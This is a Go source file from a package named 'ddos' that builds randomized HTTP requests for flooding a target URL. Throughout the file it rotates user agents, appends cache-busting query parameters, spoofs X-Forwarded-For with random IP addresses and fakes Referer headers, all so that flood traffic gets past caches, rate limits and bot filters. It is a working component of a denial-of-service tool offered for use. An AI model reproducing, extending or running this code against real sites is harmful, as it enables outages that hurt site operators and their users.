package ddos

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// RequestBuilder builds HTTP requests with randomization support
type RequestBuilder struct {
	baseURL           string
	method            string
	baseHeaders       map[string]string
	endpoints         []string
	randomizationLevel int
	rng               *rand.Rand
	rngMu             sync.Mutex // Protects rng (not thread-safe)
	userAgents        []string
	userAgentIndex    int64 // Atomic counter for round-robin
	// Pre-allocated buffers for zero-copy
	urlBuilder        strings.Builder
	headerBuilder     strings.Builder
}

// NewRequestBuilder creates a new request builder
// Always enables randomization (level 2: headers + query params)
// Always enables user agent rotation (built-in or custom file)
func NewRequestBuilder(config DDoSConfig) *RequestBuilder {
	// Load user agents (custom file or built-in - always enabled)
	var userAgents []string
	if config.UserAgentFile != "" {
		if agents, err := loadUserAgentsFromFile(config.UserAgentFile); err == nil && len(agents) > 0 {
			userAgents = agents
		} else {
			// Fallback to built-in if file loading fails
			userAgents = getBuiltInUserAgents()
		}
	} else {
		// Use built-in user agents (always enabled)
		userAgents = getBuiltInUserAgents()
	}

	builder := &RequestBuilder{
		baseURL:            config.TargetURL,
		method:             config.Method,
		baseHeaders:        make(map[string]string),
		endpoints:          []string{"/"}, // Default to root path
		randomizationLevel: 2,            // Always enable: headers + query params
		rng:                rand.New(rand.NewSource(time.Now().UnixNano())),
		userAgents:         userAgents,   // Always enabled (built-in or custom)
	}

	// Copy base headers
	for k, v := range config.Headers {
		builder.baseHeaders[k] = v
	}

	return builder
}

// BuildRequest builds a randomized HTTP request (optimized for zero-copy)
func (rb *RequestBuilder) BuildRequest() (*http.Request, error) {
	// Select endpoint (lock-free)
	endpoint := rb.SelectEndpoint()

	// Build URL with cache-busting if enabled
	fullURL := rb.baseURL
	if !strings.HasSuffix(fullURL, "/") && !strings.HasPrefix(endpoint, "/") {
		fullURL += "/"
	}
	fullURL += strings.TrimPrefix(endpoint, "/")

	// Add cache-busting parameters if randomization level >= 1
	if rb.randomizationLevel >= 1 {
		fullURL = rb.AddCacheBustingParams(fullURL)
	}

	// Create request
	req, err := http.NewRequest(rb.method, fullURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set base headers
	for k, v := range rb.baseHeaders {
		req.Header.Set(k, v)
	}

	// Set default headers if not present
	if req.Header.Get("User-Agent") == "" {
		req.Header.Set("User-Agent", rb.getRandomUserAgent())
	}
	if req.Header.Get("Accept") == "" {
		req.Header.Set("Accept", "*/*")
	}
	if req.Header.Get("Accept-Language") == "" {
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	}
	if req.Header.Get("Connection") == "" {
		req.Header.Set("Connection", "keep-alive")
	}

	// Randomize headers if level >= 2
	if rb.randomizationLevel >= 2 {
		rb.RandomizeHeaders(req)
	}

	// Randomize user agent if level >= 3
	if rb.randomizationLevel >= 3 {
		req.Header.Set("User-Agent", rb.getRandomUserAgent())
	}

	return req, nil
}

// AddCacheBustingParams adds cache-busting query parameters to URL
func (rb *RequestBuilder) AddCacheBustingParams(urlStr string) string {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return urlStr
	}

	q := parsedURL.Query()
	q.Set("_t", strconv.FormatInt(time.Now().UnixNano(), 10))
	q.Set("_r", rb.randomString(8))
	parsedURL.RawQuery = q.Encode()

	return parsedURL.String()
}

// RandomizeHeaders adds random headers to the request
func (rb *RequestBuilder) RandomizeHeaders(req *http.Request) {
	// Add random X-Request-ID
	req.Header.Set("X-Request-ID", rb.randomString(16))

	// Add random X-Forwarded-For
	req.Header.Set("X-Forwarded-For", rb.randomIP())

	// Add random Referer (optional, 50% chance)
	rb.rngMu.Lock()
	shouldAddReferer := rb.rng.Float32() < 0.5
	rb.rngMu.Unlock()
	if shouldAddReferer {
		req.Header.Set("Referer", rb.randomReferer())
	}
}

// SelectEndpoint selects a random endpoint from the list
func (rb *RequestBuilder) SelectEndpoint() string {
	if len(rb.endpoints) == 0 {
		return "/"
	}
	rb.rngMu.Lock()
	idx := rb.rng.Intn(len(rb.endpoints))
	rb.rngMu.Unlock()
	return rb.endpoints[idx]
}

// getRandomUserAgent returns a random user agent (atomic, lock-free)
func (rb *RequestBuilder) getRandomUserAgent() string {
	if len(rb.userAgents) == 0 {
		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	// Use atomic operation for lock-free access
	idx := atomic.AddInt64(&rb.userAgentIndex, 1) - 1
	return rb.userAgents[int(idx)%len(rb.userAgents)]
}

// randomString generates a random string of specified length
func (rb *RequestBuilder) randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	rb.rngMu.Lock()
	for i := range b {
		b[i] = charset[rb.rng.Intn(len(charset))]
	}
	rb.rngMu.Unlock()
	return string(b)
}

// randomIP generates a random IP address
func (rb *RequestBuilder) randomIP() string {
	rb.rngMu.Lock()
	ip1 := rb.rng.Intn(255) + 1
	ip2 := rb.rng.Intn(255) + 1
	ip3 := rb.rng.Intn(255) + 1
	ip4 := rb.rng.Intn(255) + 1
	rb.rngMu.Unlock()
	return fmt.Sprintf("%d.%d.%d.%d", ip1, ip2, ip3, ip4)
}

// randomReferer generates a random referer URL
func (rb *RequestBuilder) randomReferer() string {
	domains := []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://www.yahoo.com/",
		"https://www.facebook.com/",
		"https://www.twitter.com/",
		"https://www.reddit.com/",
	}
	rb.rngMu.Lock()
	idx := rb.rng.Intn(len(domains))
	rb.rngMu.Unlock()
	return domains[idx]
}

